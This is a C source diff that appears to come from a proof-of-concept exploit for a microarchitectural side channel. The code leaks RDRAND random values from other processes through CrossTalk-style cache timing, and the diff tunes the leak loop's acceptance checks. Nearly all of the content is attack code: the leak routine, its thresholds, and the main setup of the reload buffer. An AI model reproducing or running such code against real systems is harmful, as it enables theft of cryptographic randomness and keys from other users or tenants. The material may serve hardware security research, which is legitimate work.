@@ -21,9 +21,9 @@
 #define CROSSTALK_CONFIDENCE 2
 #define CROSSTALK_TRIES 5
 #define CROSSTALK_SIMILARITY 3
-#define CROSSTALK_CONSECUTIVE_HITS 3
-#define CROSSTALK_CONSECUTIVE_NULL_MULTIPLIER 3
-#define CROSSTALK_MAX_NULL 3
+#define CROSSTALK_CONSECUTIVE_HITS 2
+// #define CROSSTALK_CONSECUTIVE_NULL_MULTIPLIER 3
+// #define CROSSTALK_MAX_NULL 3
 
 // fpvi definitions
 #define MAX_NIBBLE_INDEX 16
@@ -125,6 +125,7 @@ uint64_t leak_new_rdrand(uint64_t old_rdrand, uint8_t* leak_buffer, uint8_t* rel
     uint64_t result = 0;
 
     while (1) {
+        // uint8_t similarity = 0;
         uint64_t last_result = result;
 
         for (int byte_index = RDRAND_OFFSET; byte_index < RDRAND_OFFSET + CROSSTALK_BYTES_TO_LEAK; ++byte_index) {
@@ -166,6 +167,11 @@ uint64_t leak_new_rdrand(uint64_t old_rdrand, uint8_t* leak_buffer, uint8_t* rel
                 }
             }
 
+            // uint8_t old_byte = old_rdrand >> ((byte_index - RDRAND_OFFSET) * 8) & 0xFF;
+            // if (byte == old_byte) {
+            //     ++similarity;
+            // }
+
             result = result << 8 | byte;
         }
 
@@ -176,12 +182,12 @@ uint64_t leak_new_rdrand(uint64_t old_rdrand, uint8_t* leak_buffer, uint8_t* rel
 
         ++consecutive_hits;
 
-        int null_bytes = 0;
+        // int null_bytes = 0;
         int similarity = 0;
         for (int i = 0; i < CROSSTALK_BYTES_TO_LEAK; ++i) {
-            if (((result >> (i * 8)) & 0xFF) == 0) {
-                ++null_bytes;
-            }
+            // if (((result >> (i * 8)) & 0xFF) == 0) {
+            //     ++null_bytes;
+            // }
 
             if (((result >> (i * 8)) & 0xFF) == ((old_rdrand >> (i * 8)) & 0xFF)) {
                 ++similarity;
@@ -189,19 +195,20 @@ uint64_t leak_new_rdrand(uint64_t old_rdrand, uint8_t* leak_buffer, uint8_t* rel
         }
 
         // Leak the same value consecutively to ensure correctness
-        // Increase required consecutive hits for the number of null bytes found
-        // As null bytes can be the result, when the reload buffer has zero hits
-        if (consecutive_hits < CROSSTALK_CONSECUTIVE_HITS + null_bytes * CROSSTALK_CONSECUTIVE_NULL_MULTIPLIER) {
+        //// Increase required consecutive hits for the number of null bytes found
+        //// As null bytes can be the result, when the reload buffer has zero hits
+        if (consecutive_hits < CROSSTALK_CONSECUTIVE_HITS) {
+            //  + null_bytes * CROSSTALK_CONSECUTIVE_NULL_MULTIPLIER) {
             continue;
         }
 
-        if (null_bytes > CROSSTALK_MAX_NULL) {
-            consecutive_hits = 0;
-            continue;
-        }
+        // if (null_bytes > CROSSTALK_MAX_NULL) {
+        //     consecutive_hits = 0;
+        //     continue;
+        // }
 
         // Check that result is different enough from old_rdrand
-        if (similarity <= CROSSTALK_SIMILARITY) {
+        if (similarity < CROSSTALK_SIMILARITY) {
             return result;
         }
     }
@@ -313,7 +320,7 @@ int main(void) {
     uint8_t *crosstalk_reloadbuffer = mmap(NULL, CROSSTALK_POSSIBLE_BYTES * CROSSTALK_STRIDE, mmap_prot, mmap_flags, -1, 0);
     if (crosstalk_reloadbuffer == MAP_FAILED) { perror("mmap reloadbuffer"); return 1; }
 
-    uint64_t old_rdrand = 0;
+    uint64_t old_rdrand = leak_new_rdrand(0, crosstalk_leak, crosstalk_reloadbuffer, CACHE_THRESHOLD);
 
     // Leak rdrand values
     uint64_t leaked_rdrand[RDRAND_TO_LEAK] = {0};
